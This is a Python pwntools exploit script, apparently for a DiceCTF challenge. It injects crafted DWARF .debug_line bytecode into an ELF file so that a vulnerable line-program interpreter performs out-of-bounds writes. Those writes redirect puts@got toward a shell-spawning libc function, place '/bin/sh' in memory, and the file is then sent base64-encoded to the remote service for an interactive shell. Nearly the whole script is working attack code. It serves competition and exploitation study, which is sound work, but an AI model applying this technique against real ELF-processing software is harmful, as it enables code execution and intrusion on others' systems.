#!/usr/bin/python
from pwn import *
import lief
import base64
import os
import ctypes

from pyleb128 import uleb128

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["ghostty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

pack = lambda b: int.to_bytes(b, byteorder="little")

SERVICE = "dicec.tf"
PORT = 32337

def start(binary,elf_file):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        b *main+868
        b *main+313
    '''

    if args.GDB:
        return gdb.debug([binary, elf_file], gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process([binary, elf_file])

def exploit(p,e):

    p.interactive()

def inject_dwarf_bytecode(input_file: str, output_file: str, bytecode):
   
    binary = lief.parse(input_file)
    
    debug_line_section = None
    for section in binary.sections:
        if section.name == ".debug_line":
            debug_line_section = section
            break

    if debug_line_section is None:
        print("No .debug_line section found in the file!")
        return


    # Step 4: Rebuild the .debug_line header
    # The header includes the section length and other fields.
    # Let's assume the original prologue and other fixed fields remain the same.

    # The initial header structure
    # [Length] (4 bytes), [DWARF Version] (2 bytes), [Prologue Length] (2 bytes),
    # [Min Instruction Length] (1 byte), [Default Is Statement] (1 byte),
    # [Line Base] (1 byte), [Line Range] (1 byte), [Opcode Base] (1 byte),
    # [Standard Opcodes] (variable size based on `Opcode Base`)

    prologue_length = 12  # This is usually 12 bytes for the header in DWARF 3+
    min_instruction_length = 1  # Typically 1 byte
    default_is_statement = 1  # Default is a statement (true)
    line_base = 0  # Base value for line numbers
    line_range = 1  # Range for each line number
    opcode_base = 10  # Standard opcodes (the number is dependent on the DWARF version)
    
    # The length of the content (not counting the header)
    content_length = len(bytecode)

    # Calculate the full length of the section (header + content)
    full_length = prologue_length + content_length - 4

    # Update the section length
    debug_line_section.size = full_length

    #some_length = 
    instruction_length = 0x16 - 0xf

    # Step 5: Construct the new header for the .debug_line section
    # DWARF version (3 for DWARF 3 or higher)
    dwarf_version = 3
    header = struct.pack(
        "<IHIBBbBBB",  # Format: Little Endian, unsigned int (length), unsigned short (version), etc.
        full_length,  # Total length of the section
        dwarf_version,  # DWARF version
        prologue_length,  # Prologue length
        min_instruction_length,  # Minimum instruction length
        default_is_statement,  # Default is a statement
        line_base,  # Line base
        line_range,  # Line range
        opcode_base,  # Opcode base
        instruction_length
    )

    print(f"Generating dwarf code with length: {hex(full_length)}")
    print(f"Actual Lenght {hex(len(header) + len(bytecode))}")
    print(f"Prologue length {hex(prologue_length)}")
    print(f"Header length {hex(len(header))}")
    print(f"Bytecode length {hex(len(bytecode))}")
    print(f"Content length {hex(content_length)}")
    
    # Step 6: Replace the section content with the new header and the balls data
    debug_line_section.content = list(header)  + list(bytecode)

    # Rebuild the modified ELF binary and write it to the output file
    binary.write(output_file)   
    print(f"Modified ELF written to {output_file}")
    
def oob_index(offset, value):
     return b"\x00" + uleb128(0).encoded + b"\x51" + uleb128(offset).encoded + value


def arb_write(offset, value):
    bytecode = b""
    for i in range(len(value)):
        bytecode += oob_index(offset+i, p8(value[i]))

    bytecode += oob_index(diff_msg, b"/")

    return bytecode

def encrypt_file(file_path):
    return base64.b64encode(open(file_path,"rb").read())





if __name__=="__main__":
    file = args.BIN

    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")
    
    if lief.__extended__ != True:
        log.warn("LIEF extended required")

    os.system("gcc -Os -g test.c -o base")
    elf_file = "base"
    output_file = "exp.elf"

    data_base = e.sym["flag"]
    puts_got = e.got["puts"]
    msg = e.sym["correct_msg"]

    diff_puts = puts_got - data_base
    diff_msg = msg - data_base

    log.info(f"libc puts @ {hex(l.sym["puts"])}")
    log.info(f"libc popen @ {hex(l.sym["popen"])}")

    log.info(f"flag @ {hex(data_base)}")
    log.info(f"puts@got @ {hex(puts_got)}")
    log.info(f"diff {puts_got - data_base}")

    #0x50d70
    bytecode = arb_write(diff_puts, p16(0xdb0))
    #bytecode = oob_index(diff_puts, b"\x70")  
    #bytecode += oob_index(diff_puts+1, b"\x0d")  
    #bytecode += oob_index(diff_puts+2, b"\x05")  


    bytecode += arb_write(diff_msg, b"/bin/sh\x00")
    bytecode += oob_index(diff_msg, b"/")



    
    log.info(f"Bytecode {bytecode} {len(bytecode)}")
    full_bytecode = bytecode + b"B" * (0x1a - len(bytecode))
    data = b"B" * 6  + full_bytecode

    inject_dwarf_bytecode(elf_file, output_file, data)

    if args.REMOTE:
        p =  start(file, None)
        data = encrypt_file(output_file)
        print(data)
        p.sendline(data)
    else:
        p = start(file,"./" + output_file)
    p.interactive()


    exploit(p,e)
